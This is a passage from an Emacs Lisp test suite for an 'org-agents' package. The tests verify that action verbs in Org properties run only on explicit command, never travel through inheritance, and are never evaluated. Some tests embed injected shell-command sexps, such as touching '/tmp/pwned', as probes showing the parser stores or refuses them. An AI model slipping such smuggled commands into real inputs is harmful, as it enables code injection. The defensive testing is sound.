                               nil t))
     (org-back-to-heading t)
     (org-entry-get nil property))))

(defun org-agents-test--put-property (file heading property value)
  "Set PROPERTY to VALUE at the entry of FILE whose heading holds HEADING.
For the tests that need a property to BE there before an action can do
anything with it -- a row that would change nothing is not counted as an
edit and is not asked about, so a fixture that lacks the property proves
nothing about the verb that deletes it."
  (with-current-buffer (find-file-noselect file)
    (org-with-wide-buffer
     (goto-char (point-min))
     (should (re-search-forward (concat "^\\*+.*" (regexp-quote heading))
                               nil t))
     (org-back-to-heading t)
     (org-entry-put nil property value))))

(defun org-agents-test--action-tags (file heading)
  "The own tags of the entry of FILE whose heading text holds HEADING."
  (with-current-buffer (find-file-noselect file)
    (org-with-wide-buffer
     (goto-char (point-min))
     (should (re-search-forward (concat "^\\*+.*" (regexp-quote heading))
                               nil t))
     (org-back-to-heading t)
     (org-get-tags nil t))))

(defmacro org-agents-test--answering-yes (&rest body)
  "Run BODY as though a user were there and said yes to everything.
`noninteractive' is bound off because that is the fact this suite runs
under and `org-agents--action-confirm' refuses on it -- which is the
whole of `org-agents-test-action-batch-refuses-a-destructive-verb'.  A
test of what happens when the answer is yes has to arrange somebody to
ask."
  (declare (indent 0))
  `(let ((noninteractive nil)
         (inhibit-interaction nil))
     ;; `yes-or-no-p' as well as `y-or-n-p', and it is not decoration:
     ;; with `noninteractive' bound off, ANY prompt this suite has not
     ;; stubbed reads standard input, and a test that reads standard
     ;; input hangs the suite for whoever runs it from a terminal.  The
     ;; gate asks with `yes-or-no-p', and so does `find-file-noselect'
     ;; about a file that changed on disk.
     (cl-letf (((symbol-function 'y-or-n-p) (lambda (&rest _) t))
               ((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
       ,@body)))

(defun org-agents-test--action-finds-nothing-to-apply ()
  "Assert `org-agents-apply-actions' here finds no action and runs no verb.
Everything is caught, and the assertions are made on WHAT was caught
rather than on its type.  That is deliberate, and measured: under the
mutation the wrk.5 tests exist to fail -- an inheriting read -- the
command does find an action, gets as far as the plan, and refuses there
for an entirely different reason.  A test that asked only \"was there a
`user-error'?\" would pass, because the batch refusal is one too.

It also means no test here can reach a prompt: the verb tripwire signals
in the plan phase, which is before the confirmation, so nothing ever
reads standard input however this is run."
  (org-agents-test--with-verb-tripwire
    (let ((signalled nil))
      (condition-case err
          (org-agents-apply-actions)
        (t (setq signalled (error-message-string err))))
      (should signalled)
      (should (string-match-p "no :AGENT_ACTION: at point" signalled))
      (should (= 0 org-agents-test--verb-calls)))))

(defmacro org-agents-test--answering-no (&rest body)
  "Run BODY as though a user were there and said no to everything."
  (declare (indent 0))
  `(let ((noninteractive nil)
         (inhibit-interaction nil))
     (cl-letf (((symbol-function 'y-or-n-p) (lambda (&rest _) nil))
               ((symbol-function 'yes-or-no-p) (lambda (&rest _) nil)))
       ,@body)))

;;;; Actions: the guarantees

(defconst org-agents-test--action-entry-points
  '((org-agents-list-approvals    . autoload)
    (org-agents-allowed-values    . autoload)
    (org-agents-check-attributes  . autoload)
    (org-agents-attribute-columns . autoload)
    (org-dblock-write:org-agents  . autoload)
    (org-agents-update            . autoload)
    (org-agents-update-buffer     . autoload)
    (org-agents-update-all        . autoload)
    (org-agents-preview           . autoload)
    (org-agents-insert-dblock     . autoload)
    (org-agents-mode              . autoload)
    (global-org-agents-mode       . autoload)
    (org-agents-faces-mode        . autoload)
    (global-org-agents-faces-mode . autoload)
    (org-agents-apply-actions     . the-only-one-that-may)
    (org-agents--collect          . internal)
    (org-agents--update-on-save   . internal)
    (org-agents--update-agent     . internal)
    (org-agents--update-markers   . internal)
    (org-agents--render-children  . internal)
    (org-agents--write-matched    . internal))
  "Every entry point, and whether it may reach an action verb.
This test owns the list, in the same style as
`org-agents-test--defcustoms'.  The `autoload' half is checked against
the source text by
`org-agents-test-action-entry-point-list-is-complete', so a fifteenth
autoload fails the suite until somebody adds it here and exercises it;
the `internal' half is the write machinery the save path is built out
of.  Exactly one row may reach a verb, and it is asserted to, so the
tripwire is proved live rather than assumed.")

(ert-deftest org-agents-test-action-entry-points-never-run-a-verb ()
  "No entry point but `org-agents-apply-actions' reaches an action verb.
The P1 guarantee of wrk.4, and it ENUMERATES: every row of
`org-agents-test--action-entry-points' is exercised against a fixture
whose agents carry `:AGENT_ACTION: set-property!(REVIEWED, today)
archive!', with all nine verbs and `org-agents--action-call' replaced by
a tripwire, and the count is asserted zero for every row but the one
that is allowed to be non-zero -- which is asserted non-zero, so a
tripwire that had quietly stopped working would fail this test rather
than pass it everywhere.

Saving is included twice over, with `org-agents-mode' on and with
`global-org-agents-mode' on, because a save is the path a user does not
ask for.

Mutation that must fail it: call `org-agents--action-call' -- or any
verb -- from anywhere on any of those paths."
  (org-agents-test--with-action-corpus
      "set-property!(REVIEWED, today) archive!"
    (let ((exercises
           (list
            (cons 'org-agents-list-approvals
                  (lambda () (org-agents-list-approvals)))
            (cons 'org-agents-allowed-values
                  (lambda () (org-agents-allowed-values "STATUS")))
            (cons 'org-agents-check-attributes
                  (lambda () (org-agents-check-attributes 'agenda)))
            (cons 'org-agents-attribute-columns
                  (lambda () (org-agents-attribute-columns '("STATUS"))))
            (cons 'org-dblock-write:org-agents
                  (lambda ()
                    (with-current-buffer (find-file-noselect agent-file)
                      (goto-char (point-min))
                      (search-forward "#+BEGIN: org-agents")
                      (org-agents-update))))
            (cons 'org-agents-update
                  (lambda ()
                    (with-current-buffer (find-file-noselect agent-file)
                      (goto-char (point-min))
                      (org-agents-update))))
            (cons 'org-agents-update-buffer
                  (lambda ()
                    (with-current-buffer (find-file-noselect agent-file)
                      (org-agents-update-buffer))))
            (cons 'org-agents-update-all
                  (lambda ()
                    (let ((org-agents-files (list agent-file)))
                      (org-agents-update-all))))
            (cons 'org-agents-preview
                  (lambda ()
                    (unwind-protect (org-agents-preview "(todo)")
                      (dolist (buf (buffer-list))
                        (when (string-match-p "org-ql" (buffer-name buf))
                          (kill-buffer buf))))))
            (cons 'org-agents-insert-dblock
                  (lambda ()
                    (with-temp-buffer (org-mode) (org-agents-insert-dblock))))
            (cons 'org-agents-mode
                  (lambda ()
                    (with-current-buffer (find-file-noselect agent-file)
                      (org-agents-mode 1)
                      (unwind-protect
                          (progn (set-buffer-modified-p t) (save-buffer))
                        (org-agents-mode -1)))))
            (cons 'global-org-agents-mode
                  (lambda ()
                    (unwind-protect
                        (progn
                          (global-org-agents-mode 1)
                          (with-current-buffer (find-file-noselect agent-file)
                            (set-buffer-modified-p t)
                            (save-buffer)))
                      (global-org-agents-mode -1))))
            (cons 'org-agents-faces-mode
                  (lambda ()
                    (with-current-buffer (find-file-noselect agent-file)
                      (unwind-protect
                          (progn (org-agents-faces-mode 1) (font-lock-ensure))
                        (org-agents-faces-mode -1)))))
            (cons 'global-org-agents-faces-mode
                  (lambda ()
                    (unwind-protect
                        (progn
                          (global-org-agents-faces-mode 1)
                          (with-current-buffer (find-file-noselect agent-file)
                            (font-lock-ensure)))
                      (global-org-agents-faces-mode -1))))
            (cons 'org-agents-apply-actions
                  (lambda ()
                    (with-current-buffer (find-file-noselect agent-file)
                      (goto-char (point-min))
                      (org-agents-apply-actions))))
            (cons 'org-agents--collect
                  (lambda ()
                    (with-current-buffer (find-file-noselect agent-file)
                      (goto-char (point-min))
                      (org-agents--collect (org-agents--read-agent)))))
            (cons 'org-agents--update-on-save
                  (lambda ()
                    (with-current-buffer (find-file-noselect agent-file)
                      (org-agents--update-on-save))))
            (cons 'org-agents--update-agent
                  (lambda ()
                    (with-current-buffer (find-file-noselect agent-file)
                      (goto-char (point-min))
                      (org-agents--update-agent (point-marker)))))
            (cons 'org-agents--update-markers
                  (lambda ()
                    (with-current-buffer (find-file-noselect agent-file)
                      (org-agents--update-markers
                       (org-agents--buffer-agents)))))
            (cons 'org-agents--render-children
                  (lambda ()
                    (with-current-buffer (find-file-noselect agent-file)
                      (goto-char (point-min))
                      (let ((agent (org-agents--read-agent)))
                        (org-agents--render-children
                         agent (org-agents--collect agent))))))
            (cons 'org-agents--write-matched
                  (lambda ()
                    (with-current-buffer (find-file-noselect agent-file)
                      (goto-char (point-min))
                      (org-agents--write-matched (point-marker) 1)))))))
      ;; The table and the exercises name the same set, so a row cannot be
      ;; added without something that actually runs it.
      (should (equal (sort (mapcar (lambda (c) (symbol-name (car c)))
                                   exercises)
                           #'string<)
                     (sort (mapcar (lambda (c) (symbol-name (car c)))
                                   org-agents-test--action-entry-points)
                           #'string<)))
      (org-agents-test--with-verb-tripwire
        (pcase-dolist (`(,name . ,kind) org-agents-test--action-entry-points)
          (setq org-agents-test--verb-calls 0)
          ;; Everything is caught, `quit' included: what is under test is
          ;; whether a verb was reached, not whether the entry point
          ;; managed to finish with its verbs shot out from under it.
          (condition-case nil
              (funcall (cdr (assq name exercises)))
            (t nil))
          (if (eq kind 'the-only-one-that-may)
              (should (> org-agents-test--verb-calls 0))
            (should (= 0 org-agents-test--verb-calls))))))))

(ert-deftest org-agents-test-action-entry-point-list-is-complete ()
  "The `autoload' half of the entry-point table is every autoload in the file.
Derived from the SOURCE TEXT rather than from the runtime, because
\"autoload\" is a property of the file: a cookie is a comment, and by the
time the package is loaded there is nothing left to ask.  The same
\"derive the set, own the list\" discipline as
`org-agents-test-every-defcustom-is-risky'.

A fifteenth -- or sixteenth -- autoload therefore fails this suite until
somebody adds it to the table and exercises it against the verb
tripwire, which is what keeps a new command from arriving with no proof
that it runs no action."
  (let* ((library (locate-library "org-agents"))
         (source (concat (file-name-sans-extension library) ".el"))
         (found nil))
    (should (file-readable-p source))
    (with-temp-buffer
      (insert-file-contents source)
      (goto-char (point-min))
      (while (re-search-forward "^;;;###autoload$" nil t)
        (forward-line 1)
        (when (looking-at "^([^ \t\n]+[ \t]+\\([^ \t\n()]+\\)")
          (push (intern (match-string 1)) found)))
      (should found))
    (should (equal
             (sort (mapcar #'symbol-name found) #'string<)
             (sort (mapcar #'symbol-name
                           (cl-loop for (name . kind)
                                    in org-agents-test--action-entry-points
                                    unless (eq kind 'internal) collect name))
                   #'string<)))))

(ert-deftest org-agents-test-action-save-differs-only-by-the-render ()
  "A save of a file whose agent carries an action writes only the render.
The byte comparison that makes \"only by the render\" a statement rather
than a hope: two fixtures, identical but for their `:AGENT_ACTION:'
lines, both saved with `org-agents-mode' on, both read back off disk --
and the two texts are equal once the action lines are deleted from the
one that had them and the stamps are masked in both.  Any write an
action caused would show up as a difference the mask does not cover.

The corpus file the agents matched is compared too, and that is the
sharper half: an action's edits land THERE, in a file the save was never
about.  It is compared in the BUFFER as well as on disk, and the buffer
is asserted unmodified.  The buffer comparison is the one that
discriminates, and only doing it the hard way showed why: a save path
that applied the action it found wrote into the buffers visiting the
matched files and saved none of them, so the bytes on disk were
identical and every off-disk assertion passed.  \"No write beyond the
render\" has to mean no write at all, buffers included.

The temporary directory is masked because the two fixtures have
different ones, and the scope property and every rendered link spell it.

Mutations that must fail it: call the action machinery from
`org-agents--update-on-save'; add the action text to the
`org-agents--read-agent' plist and act on it; stamp anything extra when
an action is present."
  (let (with-action without-action with-corpus without-corpus
        with-live without-live)
    (org-agents-test--with-action-corpus
        "set-property!(REVIEWED, today) tag!(+reviewed)"
      (with-current-buffer (find-file-noselect agent-file)
        (org-agents-mode 1)
        (set-buffer-modified-p t)
        (save-buffer))
      (with-current-buffer (find-file-noselect a)
        ;; A save of the agent's file must leave the matched entries'
        ;; buffer alone, and that means UNMODIFIED: an edit nobody saved
        ;; is still an edit.
        (should-not (buffer-modified-p))
        (setq with-live (buffer-substring-no-properties (point-min)
                                                       (point-max))))
      (setq with-action (replace-regexp-in-string
                         (regexp-quote dir) "DIR"
                         (org-agents-test--file-text agent-file))
            with-corpus (org-agents-test--file-text a)))
    (org-agents-test--with-action-corpus nil
      (with-current-buffer (find-file-noselect agent-file)
        (org-agents-mode 1)
        (set-buffer-modified-p t)
        (save-buffer))
      (with-current-buffer (find-file-noselect a)
        (should-not (buffer-modified-p))
        (setq without-live (buffer-substring-no-properties (point-min)
                                                           (point-max))))
      (setq without-action (replace-regexp-in-string
                            (regexp-quote dir) "DIR"
                            (org-agents-test--file-text agent-file))
            without-corpus (org-agents-test--file-text a)))
    ;; The file the agents matched is untouched, byte for byte, on disk
    ;; and in the buffer that visits it.
    (should (equal with-corpus without-corpus))
    (should (equal with-live without-live))
    (should (equal (org-agents--mask-matched
                    (replace-regexp-in-string "^:AGENT_ACTION:.*\n" ""
                                              with-action))
                   (org-agents--mask-matched without-action)))))

(ert-deftest org-agents-test-action-does-not-travel-through-a-prototype ()
  "An action does not arrive through a `:PROTOTYPE:' chain.
The P1 guarantee of wrk.5, and the reason is per-file trust: if a
prototype could pass an action down, the code that edits your corpus
when you act on file A is written in file B.

A master in the registry's `Prototypes' section carries
`:AGENT_ACTION: archive!'; a follower agent naming it resolves that name
to nothing, reads it out of its own drawer as nothing, and
`org-agents-apply-actions' on it refuses with no verb called.

Mutations that must fail it: drop `AGENT_' from
`org-agents--prototype-opaque-re'; read the action through
`org-agents-resolve-property'."
  (org-agents-test--with-attr-corpus
      "\
* STATUS
:PROPERTIES:
:ATTR_TYPE: string
:END:

* Prototypes
** Acting Task
:PROPERTIES:
:AGENT_ACTION: archive!
:AGENT_QUERY:  (todo)
:END:
A master that would hand its followers an action, if behaviour travelled.
"
      '(("follower.org" . "\
* Follower agent
:PROPERTIES:
:PROTOTYPE:    Acting Task
:AGENT_QUERY:  (todo)
:AGENT_SCOPE:  (\"follower.org\")
:END:
"))
    (org-agents-test--at-entry (funcall F "follower.org") "Follower agent"
      ;; The resolver will not surface it, which is Epic 3's side.
      (should-not (org-agents-resolve-property "AGENT_ACTION"))
      ;; And this epic's own read finds nothing either.
      (should-not (org-agents--entry-get "AGENT_ACTION"))
      (org-agents-test--action-finds-nothing-to-apply))))

(ert-deftest org-agents-test-action-never-evaluates-an-argument ()
  "An argument that spells Lisp is stored as the characters it spells.
Nothing in `:AGENT_ACTION:' is `read', evaluated, `format'ted into a
form, or interned into a function position: the argument below spells a
`progn' of a tripwire call and a shell command, and what reaches the
entry is the text.  The tripwire counts evaluations that must not
happen, and the sentinel file is what a shell would have created.

Quoted, because an argument spelling a bare sexp is refused BY SHAPE --
see `org-agents-test-action-parse-refuses-a-sexp-shaped-argument', which
is the other half of this guarantee.  Quoting is the documented way to
store literal parentheses, and this is what quoting gets you: text.

Mutation that must fail it: `read', `eval' or a `format'-into-a-form
anywhere in the parse or in the verb."
  (let* ((sentinel (make-temp-name
                    (expand-file-name "org-agents-action-pwned"
                                      temporary-file-directory)))
         (spelled (format
                   "(progn (org-agents-test--tripwire) (shell-command \"touch %s\"))"
                   sentinel))
         (org-agents-test--tripwire-count 0))
    (unwind-protect
        (org-agents-test--at-agent
            (concat "set-property!(NOTE, \""
                    (replace-regexp-in-string "\"" "\\\\\"" spelled)
                    "\")")
          ;; The parse itself hands the text through as one string.
          (let ((parsed (org-agents--parse-actions
                         (org-agents--entry-get "AGENT_ACTION"))))
            (should (equal parsed
                           (list (list 'org-agents-action/set-property!
                                       "NOTE" spelled)))))
          (should (= 0 org-agents-test--tripwire-count))
          (should-not (file-exists-p sentinel))
          ;; And applying it writes those characters into the drawer.
          (org-agents-test--answering-yes (org-agents-apply-actions))
          (should (equal spelled
                         (org-agents-test--action-property a "Fix widget"
                                                           "NOTE")))
          (should (= 0 org-agents-test--tripwire-count))
          (should-not (file-exists-p sentinel)))
      (when (file-exists-p sentinel) (delete-file sentinel)))))

(ert-deftest org-agents-test-action-batch-refuses-a-destructive-verb ()
  "In batch there is nobody to ask, so the run is refused rather than assumed.
MEASURED: `y-or-n-p' in `-batch' READS STANDARD INPUT and returns t for
a `y' on it, and signals `end-of-file' where stdin is closed.  So a
script, a CI job or an `emacs -batch' invocation whose stdin happened to
carry text would answer yes for the user.  The refusal is therefore
checked BEFORE `y-or-n-p' is called at all -- which is also why this
test cannot hang however it is run.

`y-or-n-p' is stubbed to a tripwire, and the assertion is that the
signal is the REFUSAL and not the tripwire: that is what says stdin was
never read.  The refusal also names the destructive verb, so the user is
told what it was that could not be asked about.

`noninteractive' is bound rather than assumed, so the test holds when
the suite is run inside a live Emacs too.

Mutation that must fail it: move the `noninteractive' check after
`y-or-n-p' -- then the tripwire's error is signalled instead and the
message assertion fails."
  (org-agents-test--at-agent "archive!"
    (let ((before-a (org-agents-test--file-text a))
          (noninteractive t))
      (cl-letf (((symbol-function 'y-or-n-p)
                 (lambda (&rest _)
                   (error "org-agents-test: must not prompt"))))
        (let ((err (should-error (org-agents-apply-actions)
                                 :type 'user-error)))
          (should (string-match-p "refused, because there is no one to ask"
                                  (error-message-string err)))
          (should (string-match-p "archive!" (error-message-string err)))))
      ;; And nothing was archived on the way to the refusal.
      (should (equal before-a (org-agents-test--file-text a))))))

(ert-deftest org-agents-test-action-does-not-travel-down-the-outline ()
  "An action does not arrive from an outline ancestor.
The mutation `org-agents-test-action-does-not-travel-through-a-prototype'
CANNOT see, and this is why that test is not enough on its own: a
prototype master is not an outline ancestor, so adding `t' as
`org-entry-get''s INHERIT argument leaves the prototype test passing.
MEASURED with that mutation in place -- the prototype test passed and
this one failed, which is the whole argument for writing both.

Asserted under `org-use-property-inheritance' nil AND t, because the
option is a user's and the guarantee is not theirs to weaken.

Mutation that must fail it: add `t' as the INHERIT argument to the read
in `org-agents-apply-actions'."
  (dolist (inheritance '(nil t))
    (org-agents-test--with-action-corpus nil
      (with-current-buffer (find-file-noselect agent-file)
        ;; The action goes on an ANCESTOR of the agent, which is where an
        ;; inheriting read would find it.
        (goto-char (point-min))
        (insert "* Container\n:PROPERTIES:\n:AGENT_ACTION: archive!\n:END:\n")
        (goto-char (point-min))
        (search-forward "* Review agent")
        (org-back-to-heading t)
        (org-demote-subtree)
        (let ((org-use-property-inheritance inheritance))
          (should-not (org-agents--entry-get "AGENT_ACTION"))
          (org-agents-test--action-finds-nothing-to-apply))))))

(ert-deftest org-agents-test-action-does-not-come-from-a-keyword-or-a-global ()
  "An action does not arrive from `#+PROPERTY:' or `org-global-properties'.
The other two routes an inheriting read opens, and the second is the
worst of them: `org-global-properties' is a VARIABLE, so an action would
be spelled in no file at all -- there would be nothing to grep for and
nothing to read before trusting it.

MEASURED: with INHERIT `t', `(org-entry-get nil \"AGENT_ACTION\" t)'
answers `\"archive!\"' from a `#+PROPERTY:' line, and answers it from
`org-global-properties' in a buffer with no such line anywhere.

Mutation that must fail it: the same INHERIT argument, by two further
routes."
  ;; A file keyword.
  (org-agents-test--with-action-corpus nil
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (insert "#+PROPERTY: AGENT_ACTION archive!\n")
      (org-mode-restart)
      (goto-char (point-min))
      (search-forward "* Review agent")
      (org-back-to-heading t)
      (should-not (org-agents--entry-get "AGENT_ACTION"))
      (org-agents-test--action-finds-nothing-to-apply)))
  ;; And a variable, spelled in no file.
  (org-agents-test--at-agent nil
    (let ((org-global-properties '(("AGENT_ACTION" . "archive!"))))
      (should-not (org-agents--entry-get "AGENT_ACTION"))
      (org-agents-test--action-finds-nothing-to-apply))))

(ert-deftest org-agents-test-action-property-is-read-once-from-the-agent ()
  "The action is read with `org-entry-get' and never through the resolver.
`org-agents-resolve-property' refuses `AGENT_' names itself, so routing
the read through it would be SAFE today -- and that is exactly why this
test exists: a guarantee that lives in another section's regexp is a
guarantee one edit away from gone.  The resolver is counted and must not
be asked about `AGENT_ACTION' at all.

Mutation that must fail it: read the action through
`org-agents-resolve-property' (measured -- the prototype test above
passes with that mutation in place, and this one does not)."
  (org-agents-test--at-agent "tag!(+reviewed)"
    (let ((asked nil)
          (real (symbol-function 'org-agents-resolve-property)))
      (cl-letf (((symbol-function 'org-agents-resolve-property)
                 (lambda (name &optional pom)
                   (push name asked)
                   (funcall real name pom))))
        (org-agents-test--answering-yes (org-agents-apply-actions)))
      (should-not (member "AGENT_ACTION" asked)))))

(ert-deftest org-agents-test-action-registry-default-cannot-supply-one ()
  "A registry declaring `AGENT_ACTION' with a default supplies nothing.
The fifth donor: the attribute registry's `:ATTR_DEFAULT:' is the last
step of the resolution order, and an `AGENT_' name short-circuits before
it.  So a registry cannot hand an action to a corpus either.

Mutation that must fail it: drop the `ATTR_DEFAULT' arm of the opaque
short-circuit -- that is, resolve `AGENT_' names like any other name."
  (org-agents-test--with-attr-corpus
      "\
* AGENT_ACTION
:PROPERTIES:
:ATTR_TYPE:    string
:ATTR_DEFAULT: archive!
:END:
A declaration that would hand every entry in the corpus an action.
"
      '(("follower.org" . "\
* Plain agent
:PROPERTIES:
:AGENT_QUERY: (todo)
:AGENT_SCOPE: (\"follower.org\")
:END:
"))
    (org-agents-test--at-entry (funcall F "follower.org") "Plain agent"
      (should-not (org-agents-resolve-property "AGENT_ACTION"))
      (should-not (org-agents--entry-get "AGENT_ACTION"))
      (org-agents-test--action-finds-nothing-to-apply))))

(ert-deftest org-agents-test-action-never-edits-its-own-agent-or-an-alias ()
  "An agent's action edits neither the agent itself nor a generated alias.
Both fall out of machinery this epic did not write --
`org-agents--self-match-p' drops the agent from its own match set, and
`org-agents-exclude' defaults to `(not (property \"AGENT_MATCH\"))' --
and both are pinned here anyway, because if the self-skip regressed an
action would rewrite the very drawer it was read from.

The agent is made to match its own query for the occasion: the scope
takes in the agent's own file and the agent is given the property the
query looks for.

Mutations that must fail it: remove the self-skip; change the default
exclude."
  (org-agents-test--at-agent "set-property!(REVIEWED, today)"
    ;; The agent now matches its own query, and lives in scope.
    (org-entry-put nil "AGENT_SCOPE" (format "(\"%s\" \"%s\")" a agent-file))
    (org-entry-put nil "NEXT_REVIEW" "[2020-01-01 Wed]")
    (org-entry-put nil "TODO" "TODO")
    (save-buffer)
    (goto-char (point-min))
    (org-agents-test--answering-yes (org-agents-update))
    (goto-char (point-min))
    (org-agents-test--answering-yes (org-agents-apply-actions))
    ;; The two entries in a.org were stamped.
    (should (org-agents-test--action-property a "Fix widget" "REVIEWED"))
    ;; The agent was not, and neither was any alias it wrote.
    (goto-char (point-min))
    (should-not (org-entry-get nil "REVIEWED"))
    (goto-char (point-min))
    (while (re-search-forward "^\\*+ " nil t)
      (org-back-to-heading t)
      (when (org-entry-get nil "AGENT_MATCH")
        (should-not (org-entry-get nil "REVIEWED")))
      (end-of-line))))

;;;; Actions: the parser

(ert-deftest org-agents-test-action-parse-two-verbs ()
  "The design's own example parses to exactly the two-element list.
`(VERB . ARGS)' per verb, in the order written, with the verb a symbol
that `fboundp' answered t for and every argument a string."
  (should (equal (org-agents--parse-actions
                  "set-property!(REVIEWED, today) tag!(+reviewed)")
                 '((org-agents-action/set-property! "REVIEWED" "today")
                   (org-agents-action/tag! "+reviewed")))))

(ert-deftest org-agents-test-action-parse-arguments-are-strings ()
  "Every argument is a string, and nothing else ever is one.
Not a symbol, not a number, not a list, not a hash table, not a
byte-code object -- the whole answer is symbols in the car position and
strings after it.  That is the property everything downstream rests on:
a verb receives DATA.

Mutation that must fail it: convert a bare argument with `read' or
`intern'."
  (dolist (text '("set-property!(N, 7)"
                  "effort!(0:30)"
                  "todo!(DONE)"
                  "priority!(A)"
                  "scheduled!(+7d)"
                  "tag!(+a -b)"
                  "set-property!(N, nil)"
                  "set-property!(N, t)"))
    (pcase-dolist (`(,verb . ,args) (org-agents--parse-actions text))
      (should (symbolp verb))
      (should (fboundp verb))
      (should (string-prefix-p "org-agents-action/" (symbol-name verb)))
      (dolist (arg args)
        (should (stringp arg))))))

(ert-deftest org-agents-test-action-parse-refuses-a-sexp-shaped-argument ()
  "An unquoted argument shaped like a sexp is refused BY SHAPE.
Parentheses are outside `org-agents--action-bare-re', so this never
becomes a value that has to be proved harmless: it is a parse error, and
the error names the verb and the argument's position, which is what the
reader has to go and look at.

The other half of the no-evaluation guarantee, the first half being
`org-agents-test-action-never-evaluates-an-argument': what a QUOTED
argument gets you is text.

Mutation that must fail it: widen `org-agents--action-bare-re' to admit
parentheses."
  (let ((err (should-error
              (org-agents--parse-actions
               "set-property!(X, (shell-command \"touch /tmp/pwned\"))")
              :type 'user-error)))
    (should (string-match-p "set-property!" (error-message-string err)))
    (should (string-match-p "argument 2" (error-message-string err))))
  ;; A leading sexp is refused as an unreadable token rather than run.
  (should-error (org-agents--parse-actions "(shell-command \"x\")")
                :type 'user-error))

(ert-deftest org-agents-test-action-parse-quoting-and-whitespace ()
  "Bare arguments are trimmed; a quoted one survives whole.
A quoted argument may hold the comma, the parenthesis and the escaped
quote that a bare one may not, and that is the documented escape hatch
for both shape rules.  A newline between verbs is whitespace, because a
`:AGENT_ACTION+:' continuation may join its pieces with one.

Mutations that must fail it: drop the `string-trim'; drop the escape
branch of `org-agents--action-quoted-re'."
  (should (equal (org-agents--parse-actions "set-property!( SPACED , trimmed )")
                 '((org-agents-action/set-property! "SPACED" "trimmed"))))
  (should (equal (org-agents--parse-actions
                  "set-property!(NOTE, \"has, comma and \\\"quote\\\"\")")
                 '((org-agents-action/set-property!
                    "NOTE" "has, comma and \"quote\""))))
  (should (equal (org-agents--parse-actions
                  "set-property!(NOTE, \"parens (and) commas, too\")")
                 '((org-agents-action/set-property!
                    "NOTE" "parens (and) commas, too"))))
  ;; Two verbs, and deliberately two DIFFERENT fields: one action writes
  ;; each field once, so `tag!(+a) tag!(-b)' is a refusal of its own and
  ;; would test the lexer no further than the first token.
  (should (equal (org-agents--parse-actions "tag!(+a)\npriority!(A)")
                 '((org-agents-action/tag! "+a")
                   (org-agents-action/priority! "A"))))
  ;; And leading and trailing whitespace around the whole text.
  (should (equal (org-agents--parse-actions "  tag!(+a)  ")
                 '((org-agents-action/tag! "+a")))))

(ert-deftest org-agents-test-action-parse-unresolved-token-names-it ()
  "A token naming no verb is a syntax error that names the token.
Both spellings: the token as written, and the function name that does
not exist -- because the second is what a reader has to define, or spell
differently, to fix it.

Mutations that must fail it: have the resolver answer with a symbol
without asking `fboundp'; make the message generic."
  (let ((err (should-error (org-agents--parse-actions "frobnicate!(x)")
                           :type 'user-error)))
    (should (string-match-p "frobnicate!" (error-message-string err)))
    (should (string-match-p "org-agents-action/frobnicate!"
                            (error-message-string err))))
  ;; A name that IS a function but is not in the namespace resolves to
  ;; nothing, because the name the resolver builds is the only one it
  ;; ever looks up.
  (should-error (org-agents--parse-actions "ignore!(x)") :type 'user-error)
  (should-error (org-agents--parse-actions "shell-command!(x)")
                :type 'user-error)
  ;; And an unresolved token does not leave a symbol behind: `intern-soft'
  ;; of a constructed name interns nothing.
  (should-not (intern-soft "org-agents-action/never-seen-before!"))
  ;; The `fboundp' half, which the cases above cannot see: they name
  ;; symbols that are not interned at all, so `intern-soft' already
  ;; answers nil and dropping `fboundp' changes nothing.  MEASURED with
  ;; the check dropped, a symbol that IS interned and has no function
  ;; reached `func-arity' and died `void-function' -- the raw signal
  ;; instead of the sentence naming the token and the function to define.
  ;; A user who renames a verb in init and leaves the token in a property
  ;; is in exactly this state.
  (unwind-protect
      (progn
        (intern "org-agents-action/vanished!")
        (let ((err (should-error (org-agents--parse-actions "vanished!(x)")
                                 :type 'user-error)))
          (should (string-match-p "vanished!" (error-message-string err)))
          (should (string-match-p "is not an action verb"
                                  (error-message-string err)))))
    (unintern "org-agents-action/vanished!" obarray)))

(ert-deftest org-agents-test-action-parse-error-runs-no-query-and-no-verb ()
  "A parse error fires before the query runs, so nothing is even opened.
There is no partial application to undo, because parsing is step 2 of
`org-agents-apply-actions' and collecting the matches is step 3.  This
is what holds that ordering: `org-agents--collect' is replaced by a
tripwire and must not be reached.

Mutation that must fail it: move the parse after the collect."
  (org-agents-test--at-agent "frobnicate!(x)"
    (let ((collected 0))
      (cl-letf (((symbol-function 'org-agents--collect)
                 (lambda (&rest _)
                   (setq collected (1+ collected))
                   (error "org-agents-test: the query was run"))))
        (org-agents-test--with-verb-tripwire
          (should-error (org-agents-apply-actions) :type 'user-error)
          (should (= 0 org-agents-test--verb-calls))))
      (should (= 0 collected)))))

(ert-deftest org-agents-test-action-parse-is-pure ()
  "Parsing reads no buffer, creates none, and writes nothing.
A hundred parses in a fixture buffer leave the modification tick where
it was, the buffer unmodified, and the same buffer current.  Purity is
what lets the command parse before it has decided to do anything at all.

Mutation that must fail it: parse with `with-temp-buffer' and
`looking-at'."
  (org-agents-test--at-agent "set-property!(REVIEWED, today) tag!(+reviewed)"
    (let ((tick (buffer-chars-modified-tick))
          (buffer (current-buffer))
          (modified (buffer-modified-p))
          (point (point)))
      (dotimes (_ 100)
        (org-agents--parse-actions
         "set-property!(REVIEWED, today) tag!(+reviewed)"))
      (should (eq buffer (current-buffer)))
      (should (= tick (buffer-chars-modified-tick)))
      (should (eq modified (buffer-modified-p)))
      (should (= point (point))))))

(ert-deftest org-agents-test-action-parse-arity ()
  "A verb given the wrong number of arguments is refused, with the counts.
`func-arity' does the work, so a verb defined in init is checked with no
declaration of its own.

Mutation that must fail it: drop the `func-arity' check."
  (let ((err (should-error (org-agents--parse-actions "todo!()")
                          :type 'user-error)))
    (should (string-match-p "todo!" (error-message-string err)))
    (should (string-match-p "takes 1 argument, and 0 were given"
                            (error-message-string err))))
  (let ((err (should-error (org-agents--parse-actions "todo!(A, B)")
                          :type 'user-error)))
    (should (string-match-p "takes 1 argument, and 2 were given"
                            (error-message-string err))))
  ;; A verb with no arguments given one, and given none, which is right.
  (should-error (org-agents--parse-actions "archive!(x)") :type 'user-error)
  (should (equal (org-agents--parse-actions "archive!")
                 '((org-agents-action/archive!))))
  ;; And an empty argument list is the same as none.
  (should (equal (org-agents--parse-actions "archive!()")
                 '((org-agents-action/archive!))))
  (should-error (org-agents--parse-actions "set-property!(ONE)")
                :type 'user-error))

(ert-deftest org-agents-test-action-parse-archive-must-be-last ()
  "A terminal verb must be the last one, and may appear once.
`archive!' removes the subtree a later verb would edit, so the ordering
